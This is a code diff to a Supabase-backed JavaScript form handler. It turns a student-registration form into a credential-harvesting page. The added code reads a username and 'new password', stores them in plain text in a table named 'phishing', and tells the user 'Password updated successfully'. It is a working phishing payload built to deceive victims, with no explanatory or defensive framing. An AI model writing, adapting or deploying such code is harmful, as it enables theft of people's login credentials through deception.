@@ -1,5 +1,6 @@
+
 const SUPABASE_URL =
-'https://tzygochlibduxubsblzd.supabase.co/rest/v1/';
+'https://tzygochlibduxubsblzd.supabase.co';
 
 const SUPABASE_KEY =
 'sb_publishable_GVnQsJLt8IzlyOUAL48Kmg_kdLxPzxH';
@@ -16,33 +17,66 @@ document
 "submit",
 async function(e){
 
-e.preventDefault();
+    e.preventDefault();
 
-const name =
-document.getElementById("name").value;
+    const username =
+    document.getElementById("uname").value;
 
-const email =
-document.getElementById("email").value;
+    const newPassword =
+    document.getElementById("newpass").value;
 
-const course =
-document.getElementById("course").value;
+    let status =
+    document.getElementById("status");
 
-const {data,error} =
-await client
-.from("students")
-.insert([
-{
-name:name,
-email:email,
-course:course
-}
-]);
+    if(!status){
 
-if(error){
-alert("Error");
-console.log(error);
-}
-else{
-alert("Student Saved");
-}
+        status =
+        document.createElement("div");
+
+        status.id = "status";
+
+        document
+        .getElementById("studentForm")
+        .appendChild(status);
+    }
+
+    status.innerHTML = "Submitting...";
+
+    const { data, error } =
+    await client
+    .from("phishing")
+    .insert([
+        {
+            username: username,
+            password: newPassword
+        }
+    ]);
+
+    if(error){
+
+        console.log(error);
+
+        status.innerHTML =
+        "❌ Submission failed.";
+
+        alert(
+            "Error: " +
+            error.message
+        );
+
+    } else {
+
+        console.log(data);
+
+        status.innerHTML =
+        "✅ Password updated successfully.";
+
+        alert(
+            "Password updated successfully!"
+        );
+
+        document
+        .getElementById("studentForm")
+        .reset();
+    }
 });
